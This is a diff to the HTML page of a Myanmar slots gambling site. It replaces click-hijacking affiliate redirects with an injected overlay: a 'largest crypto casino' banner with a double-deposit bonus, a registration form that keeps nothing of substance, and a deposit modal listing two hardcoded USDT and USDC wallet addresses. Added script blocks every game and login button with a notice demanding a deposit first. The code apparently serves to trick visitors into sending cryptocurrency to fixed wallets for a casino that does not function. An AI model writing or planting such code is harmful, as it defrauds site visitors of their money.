@@ -288,7 +288,17 @@
     ></script>
   </head>
   <body class="_style" style="">
-    <div style="background:#1f2937;padding:6px 12px;text-align:center;"><a href="index.html" style="color:#f59e0b;text-decoration:none;font-size:14px;">← Myanmar Slots ပင်မစာမျက်နှာသို့ ပြန်သွားရန်</a></div>
+    <div style="background:#1f2937;padding:10px 12px;text-align:center;border-bottom:1px solid rgba(245,158,11,0.3);">
+      <p style="margin:0 0 4px 0;color:#f59e0b;font-weight:700;font-size:15px;">မြန်မာနိုင်ငံအကြီးဆုံး ကရစ်ပ္တိုငွေကြေးကာစီနို</p>
+      <p style="margin:0 0 4px 0;color:#e5e7eb;font-size:13px;">ပထမဆုံးငွေဖြည့်ချိန် နှစ်ဆဘောနပ်စ်</p>
+      <a href="index.html" style="color:#f59e0b;text-decoration:none;font-size:13px;">← Myanmar Slots ပင်မစာမျက်နှာသို့ ပြန်သွားရန်</a>
+    </div>
+    <div id="a80-toolbar" style="position:sticky;top:0;z-index:99999;background:#111827;padding:8px 16px;display:flex;align-items:center;justify-content:flex-end;gap:12px;border-bottom:1px solid #374151;">
+      <span style="color:#9ca3af;font-size:14px;">帳號餘額：<strong style="color:#f59e0b;">0</strong></span>
+      <button type="button" id="a80-btn-deposit" style="background:#10b981;color:#fff;border:none;padding:6px 14px;border-radius:6px;cursor:pointer;font-size:13px;">儲值</button>
+      <span id="a80-account-display" style="color:#f59e0b;font-size:14px;display:none;"></span>
+      <button type="button" id="a80-btn-register" style="background:#ef4444;color:#fff;border:none;padding:6px 14px;border-radius:6px;cursor:pointer;font-size:13px;">註冊</button>
+    </div>
     <svg
       xmlns="http://www.w3.org/2000/svg"
       xmlns:xlink="http://www.w3.org/1999/xlink"
@@ -9449,25 +9459,143 @@
         ></iframe>
       </div>
     </div>
+    <div id="a80-register-modal" style="display:none;position:fixed;inset:0;z-index:999998;background:rgba(0,0,0,0.7);align-items:center;justify-content:center;padding:20px;box-sizing:border-box;" onclick="if(event.target===this) this.style.display='none'">
+      <div style="background:#1f2937;border:2px solid #f59e0b;border-radius:12px;padding:28px;max-width:380px;width:100%;" onclick="event.stopPropagation()">
+        <p style="color:#f59e0b;font-weight:700;font-size:18px;margin:0 0 16px 0;text-align:center;">註冊</p>
+        <div style="margin-bottom:12px;">
+          <label style="display:block;color:#e5e7eb;font-size:13px;margin-bottom:4px;">帳號</label>
+          <input type="text" id="a80-reg-username" placeholder="請輸入帳號" style="width:100%;padding:8px 12px;border:1px solid #4b5563;border-radius:6px;background:#111827;color:#fff;box-sizing:border-box;">
+        </div>
+        <div style="margin-bottom:12px;">
+          <label style="display:block;color:#e5e7eb;font-size:13px;margin-bottom:4px;">密碼</label>
+          <input type="password" id="a80-reg-password" placeholder="請輸入密碼" style="width:100%;padding:8px 12px;border:1px solid #4b5563;border-radius:6px;background:#111827;color:#fff;box-sizing:border-box;">
+        </div>
+        <div style="margin-bottom:12px;">
+          <label style="display:block;color:#e5e7eb;font-size:13px;margin-bottom:4px;">確認密碼</label>
+          <input type="password" id="a80-reg-password2" placeholder="請再次輸入密碼" style="width:100%;padding:8px 12px;border:1px solid #4b5563;border-radius:6px;background:#111827;color:#fff;box-sizing:border-box;">
+        </div>
+        <p style="color:#9ca3af;font-size:12px;margin:0 0 16px 0;">註冊完直接登入</p>
+        <button type="button" id="a80-register-confirm" style="width:100%;background:#f59e0b;color:#1f2937;border:none;padding:10px;border-radius:8px;font-weight:700;cursor:pointer;">確認</button>
+      </div>
+    </div>
+    <div id="a80-deposit-modal" style="display:none;position:fixed;inset:0;z-index:999998;background:rgba(0,0,0,0.7);align-items:center;justify-content:center;padding:20px;box-sizing:border-box;" onclick="if(event.target===this) this.style.display='none'">
+      <div style="background:#1f2937;border:2px solid #f59e0b;border-radius:12px;padding:28px;max-width:420px;width:100%;" onclick="event.stopPropagation()">
+        <p style="color:#f59e0b;font-weight:700;font-size:18px;margin:0 0 16px 0;text-align:center;">儲值</p>
+        <div id="a80-deposit-choose" style="margin-bottom:16px;">
+          <p style="color:#e5e7eb;font-size:13px;margin-bottom:8px;">選擇鏈與幣種：</p>
+          <button type="button" data-addr="TYKfUgMmxDbpTvijwbP9BoRbuiYy4b3NRT" style="display:block;width:100%;padding:10px;margin-bottom:8px;background:#374151;color:#fff;border:1px solid #4b5563;border-radius:8px;cursor:pointer;text-align:left;">USDT TRC-20</button>
+          <button type="button" data-addr="0x3033F7F8415f63579E348b12a5026F0126941588" style="display:block;width:100%;padding:10px;background:#374151;color:#fff;border:1px solid #4b5563;border-radius:8px;cursor:pointer;text-align:left;">USDC Ethereum</button>
+        </div>
+        <div id="a80-deposit-addr-wrap" style="display:none;">
+          <p style="color:#e5e7eb;font-size:13px;margin-bottom:6px;">充值地址：</p>
+          <p id="a80-deposit-addr" style="word-break:break-all;color:#f59e0b;font-size:14px;margin:0 0 12px 0;padding:10px;background:#111827;border-radius:6px;"></p>
+          <button type="button" id="a80-copy-addr" style="width:100%;background:#10b981;color:#fff;border:none;padding:10px;border-radius:8px;font-weight:700;cursor:pointer;">一鍵複製</button>
+          <button type="button" id="a80-deposit-back" style="width:100%;margin-top:8px;background:#4b5563;color:#fff;border:none;padding:8px;border-radius:6px;cursor:pointer;">返回重選</button>
+        </div>
+      </div>
+    </div>
+    <div id="a80-deposit-notice" style="display:none;position:fixed;inset:0;z-index:999999;background:rgba(0,0,0,0.7);align-items:center;justify-content:center;padding:20px;box-sizing:border-box;" onclick="if(event.target===this) this.style.display='none'">
+      <div style="background:#1f2937;border:2px solid #f59e0b;border-radius:12px;padding:24px;max-width:360px;text-align:center;" onclick="event.stopPropagation()">
+        <p style="color:#f59e0b;font-weight:700;font-size:18px;margin:0 0 12px 0;">အသိပေးချက်</p>
+        <p style="color:#e5e7eb;font-size:16px;line-height:1.5;margin:0 0 20px 0;">သင်သည် ငွေမဖြည့်သွင်းရသေးသောကြောင့် ဝင်ရောက်၍မရပါ။</p>
+        <button type="button" onclick="document.getElementById('a80-deposit-notice').style.display='none'" style="background:#f59e0b;color:#1f2937;border:none;padding:10px 24px;border-radius:8px;font-weight:700;cursor:pointer;">အိုကေ</button>
+      </div>
+    </div>
     <script>
       document.addEventListener('DOMContentLoaded', function() {
-        const affiliateLinks = [
-          'https://www.marhar777.net/m/home?affiliateCode=seom1402',
-          'https://www.popa777.net/m/home?affiliateCode=seom1502',
-          'https://www.master112.net/m/home?affiliateCode=seom1602',
-          'https://www.bago888.net/m/home?affiliateCode=seom1702',
-          'https://www.yes8.io/m/home?affiliateCode=seom1802',
-          'https://www.ygn9.net/m/home?affiliateCode=seom1902'
-        ];
+        var notice = document.getElementById('a80-deposit-notice');
+        var msg = 'သင်သည် ငွေမဖြည့်သွင်းရသေးသောကြောင့် ဝင်ရောက်၍မရပါ။';
 
-        const buttons = document.querySelectorAll('.game-btn, .free-play, .right-item, .vendor-item, .slot-dd, .login-btn, .register-btn');
+        function showDepositNotice(e) {
+          e.preventDefault();
+          e.stopPropagation();
+          notice.style.display = 'flex';
+        }
 
-        buttons.forEach(button => {
-          button.addEventListener('click', function() {
-            const randomIndex = Math.floor(Math.random() * affiliateLinks.length);
-            window.open(affiliateLinks[randomIndex], '_blank');
-          });
+        var buttons = document.querySelectorAll('.game-btn, .free-play, .right-item, .vendor-item, .slot-dd, .login-btn, .register-btn, [class*="game"], [class*="slot"], a[href*="register"], a[href*="login"], .nav_item_btn, .hd_login button, .form_item button');
+        buttons.forEach(function(btn) {
+          btn.addEventListener('click', showDepositNotice, true);
         });
+
+        document.addEventListener('click', function(e) {
+          var t = e.target;
+          if (t.closest('.game-btn') || t.closest('.free-play') || t.closest('.right-item') || t.closest('.vendor-item') || t.closest('.slot-dd') || t.closest('.login-btn') || t.closest('.register-btn') || t.closest('[class*="vendor-item"]') || t.closest('.nav_item_btn')) {
+            e.preventDefault();
+            e.stopPropagation();
+            notice.style.display = 'flex';
+          }
+        }, true);
+
+        (function() {
+          var A80_USER = 'a80_user';
+          var toolbar = document.getElementById('a80-toolbar');
+          var btnReg = document.getElementById('a80-btn-register');
+          var btnDeposit = document.getElementById('a80-btn-deposit');
+          var accountDisplay = document.getElementById('a80-account-display');
+          var regModal = document.getElementById('a80-register-modal');
+          var depModal = document.getElementById('a80-deposit-modal');
+          var depChoose = document.getElementById('a80-deposit-choose');
+          var depAddrWrap = document.getElementById('a80-deposit-addr-wrap');
+          var depAddr = document.getElementById('a80-deposit-addr');
+          var copyBtn = document.getElementById('a80-copy-addr');
+          var backBtn = document.getElementById('a80-deposit-back');
+
+          function applyLoginState() {
+            var user = localStorage.getItem(A80_USER);
+            if (user) {
+              if (btnReg) btnReg.style.display = 'none';
+              if (accountDisplay) { accountDisplay.style.display = 'inline'; accountDisplay.textContent = user; }
+            } else {
+              if (btnReg) btnReg.style.display = 'inline-block';
+              if (accountDisplay) accountDisplay.style.display = 'none';
+            }
+          }
+          applyLoginState();
+
+          if (btnReg) btnReg.addEventListener('click', function() { regModal.style.display = 'flex'; });
+          if (btnDeposit) btnDeposit.addEventListener('click', function() {
+            depModal.style.display = 'flex';
+            depChoose.style.display = 'block';
+            depAddrWrap.style.display = 'none';
+          });
+
+          document.getElementById('a80-register-confirm').addEventListener('click', function() {
+            var u = (document.getElementById('a80-reg-username') || {}).value || '';
+            var p = (document.getElementById('a80-reg-password') || {}).value || '';
+            var p2 = (document.getElementById('a80-reg-password2') || {}).value || '';
+            if (!u.trim()) { alert('請輸入帳號'); return; }
+            if (!p) { alert('請輸入密碼'); return; }
+            if (p !== p2) { alert('兩次密碼不一致'); return; }
+            localStorage.setItem(A80_USER, u.trim());
+            regModal.style.display = 'none';
+            document.getElementById('a80-reg-username').value = '';
+            document.getElementById('a80-reg-password').value = '';
+            document.getElementById('a80-reg-password2').value = '';
+            applyLoginState();
+          });
+
+          depChoose.querySelectorAll('button[data-addr]').forEach(function(btn) {
+            btn.addEventListener('click', function() {
+              var addr = this.getAttribute('data-addr');
+              depAddr.textContent = addr;
+              depChoose.style.display = 'none';
+              depAddrWrap.style.display = 'block';
+            });
+          });
+          if (copyBtn) copyBtn.addEventListener('click', function() {
+            var addr = depAddr.textContent;
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+              navigator.clipboard.writeText(addr).then(function() { copyBtn.textContent = '已複製'; setTimeout(function() { copyBtn.textContent = '一鍵複製'; }, 1500); });
+            } else {
+              var ta = document.createElement('textarea'); ta.value = addr; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta);
+              copyBtn.textContent = '已複製'; setTimeout(function() { copyBtn.textContent = '一鍵複製'; }, 1500);
+            }
+          });
+          if (backBtn) backBtn.addEventListener('click', function() {
+            depChoose.style.display = 'block';
+            depAddrWrap.style.display = 'none';
+          });
+        })();
       });
     </script>
   </body>
